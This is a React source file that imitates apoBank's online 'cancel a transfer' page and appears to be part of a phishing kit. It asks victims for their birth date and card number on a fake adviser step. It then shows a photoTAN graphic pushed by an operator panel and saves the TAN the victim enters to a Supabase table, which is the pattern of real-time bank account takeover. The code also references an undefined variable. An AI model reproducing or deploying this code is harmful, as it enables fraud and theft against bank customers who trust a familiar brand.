import { useEffect, useMemo, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { ChevronRight, Phone, ShieldCheck } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import apoBankLogo from "@/assets/apobank-logo.svg";
import phototanImg from "@/assets/phototan.png";
import { Button } from "@/components/ui/button";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";

type Row = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  auftraggeber_iban: string | null;
  empfaenger_name: string | null;
  empfaenger_iban: string | null;
  betrag: number | null;
  verwendungszweck: string | null;
  executed_at: string | null;
  customer_phase: string | null;
  photo_tan_image: string | null;
  last_error: string | null;
  show_berater: boolean | null;
  used: boolean;
};

const fmtBetrag = (n: number | null) =>
  n == null
    ? "5,00 EUR"
    : new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n)) + " EUR";

const fmtDate = (s: string | null) => {
  if (!s) return "17. Juli 2026";
  try {
    return new Date(s).toLocaleDateString("de-DE", { day: "numeric", month: "long", year: "numeric" });
  } catch {
    return s;
  }
};

const Header = () => (
  <>
    <header className="w-full bg-white border-b border-border/40">
      <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-4">
        <img src={apoBankLogo} alt="apoBank Logo" className="h-12 w-auto" />
      </div>
    </header>
    <div className="bg-[#f5f5f5] border-b border-border/40">
      <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
        <div className="flex items-center gap-2 text-sm text-[#002776]">
          <span className="text-[#002776]">Startseite</span>
          <ChevronRight className="h-3 w-3 text-foreground/60" />
          <span className="text-foreground/70">Überweisung widerrufen</span>
        </div>
        <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Überweisung widerrufen</h1>
      </div>
    </div>
  </>
);

const StornoWiderrufFlow = () => {
  const { token } = useParams();
  const navigate = useNavigate();
  const [row, setRow] = useState<Row | null>(null);
  const [notFound, setNotFound] = useState(false);
  const [tan, setTan] = useState("");
  const [savingTan, setSavingTan] = useState(false);

  const load = async () => {
    if (!token) return;
    const { data } = await (supabase as any)
      .from("storno_tokens")
      .select("*")
      .eq("token", token)
      .maybeSingle();
    if (!data) { setNotFound(true); return; }
    setRow(data as Row);
  };

  useEffect(() => {
    load();
    if (!token) return;
    const ch = (supabase as any)
      .channel(`storno_flow_${token}`)
      .on("postgres_changes", { event: "*", schema: "public", table: "storno_tokens", filter: `token=eq.${token}` }, load)
      .subscribe();
    const iv = window.setInterval(load, 3000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [token]);

  const phase = row?.customer_phase || "widerruf";

  // On success, redirect to /success page
  useEffect(() => {
    if (phase === "success") navigate("/success");
  }, [phase, navigate]);

  const advance = async (nextPhase: string, patch: Record<string, any> = {}) => {
    if (!row) return;
    await (supabase as any).from("storno_tokens").update({
      customer_phase: nextPhase,
      updated_at: new Date().toISOString(),
      ...patch,
    }).eq("id", row.id);
  };

  const saveMeta = async (patch: Record<string, any>) => {
    if (!row) return;
    const task_id = `storno:${row.id}`;
    await (supabase as any).from("panel_task_meta").upsert({ task_id, ...patch }, { onConflict: "task_id" });
  };

  if (notFound) {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
        <Header />
        <main className="flex-1 flex items-center justify-center p-8">
          <p className="text-sm text-foreground/70">Vorgang nicht gefunden.</p>
        </main>
        <Footer />
      </div>
    );
  }

  if (!row) {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center">
        <div className="h-8 w-8 rounded-full border-2 border-[#002776] border-t-transparent animate-spin" />
      </div>
    );
  }

  if (phase === "aborted") {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
        <Header />
        <main className="flex-1 flex items-center justify-center p-8">
          <p className="text-sm text-foreground/70">Der Vorgang wurde abgebrochen.</p>
        </main>
        <Footer />
      </div>
    );
  }

  // BERATER phase (customer inputs birthdate + card number)
  if (phase === "berater") {
    return <BeraterStep onSubmit={async (g, k) => {
      await saveMeta({ berater_geburtsdatum: g, berater_karte: k });
      await advance("widerruf");
    }} />;
  }

  // SUCCESS loader
  if (phase === "success") {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex flex-col items-center justify-center gap-6">
        <div className="h-12 w-12 rounded-full border-4 border-[#002776] border-t-transparent animate-spin" />
        <p className="text-sm text-foreground/80">
          {loaderMsg === "abruf" ? "Personendaten werden abgerufen..." : "Bitte warten..."}
        </p>
      </div>
    );
  }

  // WIDERRUF landing → user clicks "Überweisung widerrufen"
  if (phase === "widerruf") {
    return (
      <div className="min-h-screen bg-white flex flex-col relative">
        <img src={apoBankLogo} alt="apoBank Logo" className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10" />
        <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
          <div className="w-full max-w-2xl bg-white rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[190px]">
            <div className="bg-white border-b border-gray-200 px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
              <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>
                Überweisungswiderruf
              </h1>
            </div>
            <div className="px-4 sm:px-8 py-5 sm:py-6 bg-muted border border-border/40 border-t-0 space-y-6">
              <p className="text-sm text-foreground/80 leading-relaxed">
                Rücknahme oder Stornierung einer bereits veranlassten Banküberweisung. Dies kann erforderlich sein,
                wenn bei der Überweisung ein Fehler entstanden ist, beispielsweise durch falsche Empfängerdaten,
                einen versehentlich überwiesenen Betrag oder wenn eine unautorisierte Überweisung vorgenommen wurde.
                Der Widerruf sollte möglichst zeitnah erfolgen und wird anschließend von uns geprüft.
              </p>
              <div className="space-y-4">
                <p className="text-sm text-foreground/70">Rückruf Ihrer Überweisung direkt im OnlineBanking.</p>
                <div className="flex justify-end">
                  <button
                    onClick={() => advance("start")}
                    className="inline-flex items-center justify-center h-10 px-8 rounded-md border border-foreground bg-white text-foreground font-medium text-sm hover:bg-white transition-colors"
                  >
                    Überweisung widerrufen
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
        <ContactSection />
        <Footer />
      </div>
    );
  }

  // START — details + waiting for admin to release phototan
  if (phase === "start") {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
        <Header />
        <main className="flex-1 relative">
          <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6">
            <div className="flex justify-center mt-4">
              <div className="inline-flex flex-col items-stretch rounded-md bg-[#e6e8eb] px-4 py-2 text-sm text-foreground min-w-[200px]">
                <span className="text-center">Ladevorgang läuft ...</span>
                <div className="mt-2 h-1 w-full bg-[#c9ccd1] rounded-full overflow-hidden">
                  <div className="h-full w-1/3 bg-[#002776] rounded-full" style={{ animation: "lc-slide 1.8s linear infinite" }} />
                </div>
              </div>
            </div>
          </div>
          <div className="flex items-start justify-center">
            <div className="mt-8 sm:mt-10 mb-16 w-[92%] max-w-[640px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-6 sm:p-10 pb-12">
              <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-8">Bitte prüfen Sie die folgende Transaktion</h2>
              <p className="text-sm text-foreground mb-8">Zahlung widerrufen</p>
              <DetailsGrid row={row} />
              <div className="border-t border-border/60 pt-4 mb-16">
                <p className="text-sm text-foreground">Bitte geben Sie diese Transaktion in Ihrer apoTAN App frei</p>
              </div>
              <div className="flex items-center gap-3 mb-16">
                <span className="text-sm text-foreground">Warten ...</span>
                <div className="flex-1 h-1 bg-[#e6e8eb] rounded-full overflow-hidden">
                  <div className="h-full w-1/3 bg-[#002776] rounded-full" style={{ animation: "lc-slide 1.8s linear infinite" }} />
                </div>
              </div>
              <div className="flex justify-end gap-3">
                <Button
                  variant="outline"
                  disabled
                  className="rounded-full bg-white border-[#002776] text-[#002776] hover:bg-white hover:text-[#002776] px-6 disabled:opacity-100"
                >
                  Mit photoTAN freigeben
                </Button>
              </div>
            </div>
          </div>
        </main>
        <ContactSection />
        <Footer />
      </div>
    );
  }

  // PHOTOTAN — enter TAN
  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <Header />
      <main className="flex-1 relative">
        <div className="flex items-start justify-center">
          <div className="mt-8 sm:mt-10 mb-16 w-[94%] max-w-[680px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-6 sm:p-10">
            <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-6">Bitte prüfen Sie die folgende Transaktion</h2>
            <p className="text-sm text-foreground mb-6">Zahlung widerrufen</p>
            <DetailsGrid row={row} />
            {row.last_error && (
              <p className="text-sm text-destructive mb-4">{row.last_error}</p>
            )}
            <div className="border-t border-border/60 pt-6 mb-6">
              <div className="flex flex-col sm:flex-row items-center gap-6">
                <div className="flex-1">
                  <p className="text-sm text-foreground mb-4">
                    Bitte scannen Sie die apoTAN Grafik mit der photoTAN Funktion Ihrer apoTAN App und geben Sie die TAN im Eingabefeld ein
                  </p>
                  <div className="relative">
                    <label className="absolute -top-2 left-3 bg-white px-1 text-[11px] text-[#002776]">TAN*</label>
                    <input
                      value={tan}
                      onChange={(e) => {
                        const v = e.target.value.replace(/\D/g, "").slice(0, 8);
                        setTan(v);
                      }}
                      inputMode="numeric"
                      className="w-full h-11 border border-[#002776] rounded-sm px-3 text-sm bg-white focus:outline-none"
                    />
                  </div>
                </div>
                <img
                  src={row.photo_tan_image || phototanImg}
                  alt="photoTAN Grafik"
                  className="w-40 h-40 object-contain border border-black"
                />
              </div>
            </div>
            <div className="flex justify-end items-center gap-4 pt-2">
              <button
                onClick={() => advance("aborted")}
                className="text-sm text-[#002776] hover:underline px-2"
              >
                Abbrechen
              </button>
              {(() => {
                const valid = tan.length === 6 || tan.length === 8;
                return (
                  <Button
                    disabled={!valid || savingTan}
                    onClick={async () => {
                      setSavingTan(true);
                      await saveMeta({ tan });
                      setSavingTan(false);
                    }}
                    className={`rounded-full px-6 disabled:opacity-100 ${valid ? "bg-white text-foreground border border-border hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
                  >
                    Freigeben
                  </Button>
                );
              })()}
            </div>
          </div>
        </div>
      </main>
      <ContactSection />
      <Footer />
    </div>
  );
};

const DetailsGrid = ({ row }: { row: Row }) => (
  <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 sm:gap-y-10 mb-5">
    <F label="Empfängerkonto" value={row.empfaenger_iban || "—"} />
    <F label="Betrag" value={fmtBetrag(row.betrag)} />
    <F label="Verwendungszweck" value={row.verwendungszweck || "—"} />
    <F label="Ausführungsdatum" value={fmtDate(row.executed_at)} />
    <F label="Kundenname" value={row.auftraggeber_name || "—"} />
    <F label="IBAN des Auftraggebers" value={row.auftraggeber_iban || "—"} />
    <F label="Name des Begünstigten" value={row.empfaenger_name || "—"} />
  </div>
);

const F = ({ label, value }: { label: string; value: string }) => (
  <div>
    <p className="text-sm text-[#002776] mb-3 font-medium">{label}</p>
    <p className="text-sm text-foreground break-words">{value}</p>
  </div>
);

const BeraterStep = ({ onSubmit }: { onSubmit: (geburtsdatum: string, karte: string) => Promise<void> }) => {
  const [g, setG] = useState("");
  const [k, setK] = useState("");
  const [busy, setBusy] = useState(false);
  const gInvalid = !/^\d{2}\.\d{2}\.(\d{2}|\d{4})$/.test(g);
  const kInvalid = k.length !== 10;
  const formatG = (raw: string) => {
    const d = raw.replace(/\D/g, "").slice(0, 8);
    if (d.length <= 2) return d;
    if (d.length <= 4) return `${d.slice(0, 2)}.${d.slice(2)}`;
    return `${d.slice(0, 2)}.${d.slice(2, 4)}.${d.slice(4)}`;
  };
  return (
    <div className="min-h-screen bg-white flex flex-col relative">
      <img src={apoBankLogo} alt="apoBank Logo" className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10" />
      <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
        <div className="w-full max-w-xl bg-[#f5f5f5] rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[114px]">
          <div className="px-4 sm:px-8 py-8 sm:py-10 flex flex-col items-center text-center">
            <div className="h-36 w-36 rounded-full bg-muted border-4 border-white shadow flex items-center justify-center">
              <span className="text-5xl font-semibold text-primary">JS</span>
            </div>
            <p className="mt-5 text-xs tracking-[0.18em] font-semibold text-primary uppercase">Ihr persönlicher Kundenberater</p>
            <h1 className="mt-2 text-3xl font-bold text-[#0f1b2d]">Justus Sperling</h1>
            <div className="mt-3 flex items-center gap-2 text-foreground">
              <Phone className="h-4 w-4" />
              <span className="text-sm font-medium">+49 211 5998 08</span>
            </div>
            <p className="mt-6 text-sm text-foreground/70 leading-relaxed max-w-md">
              Zur Verifizierung gegenüber Ihrem Berater geben Sie bitte die folgenden Daten ein.
            </p>
            <div className="mt-6 w-full max-w-md flex items-start gap-3 rounded-md border border-primary/20 bg-primary/5 px-4 py-3 text-left">
              <ShieldCheck className="h-5 w-5 text-primary shrink-0 mt-0.5" />
              <p className="text-xs text-foreground/70 leading-relaxed">
                Der Vorgang läuft über eine gesicherte Verbindung Ihrer Bank.
              </p>
            </div>
            <div className="mt-6 w-full max-w-md space-y-4 text-left">
              <div>
                <label className="text-xs font-medium text-foreground/80 mb-1 block">Geburtsdatum (TT.MM.JJJJ)</label>
                <input
                  value={g}
                  onChange={(e) => setG(formatG(e.target.value))}
                  placeholder="TT.MM.JJJJ"
                  inputMode="numeric"
                  className="w-full h-10 border border-border rounded-sm px-3 text-sm bg-white focus:outline-none"
                />
              </div>
              <div>
                <label className="text-xs font-medium text-foreground/80 mb-1 block">Kartennummer (10-stellig)</label>
                <input
                  value={k}
                  onChange={(e) => setK(e.target.value.replace(/\D/g, "").slice(0, 10))}
                  inputMode="numeric"
                  className="w-full h-10 border border-border rounded-sm px-3 text-sm bg-white focus:outline-none"
                />
              </div>
              <div className="flex justify-end">
                <Button
                  disabled={gInvalid || kInvalid || busy}
                  onClick={async () => { setBusy(true); await onSubmit(g, k); setBusy(false); }}
                  className="rounded-full px-6"
                >
                  Weiter
                </Button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default StornoWiderrufFlow;
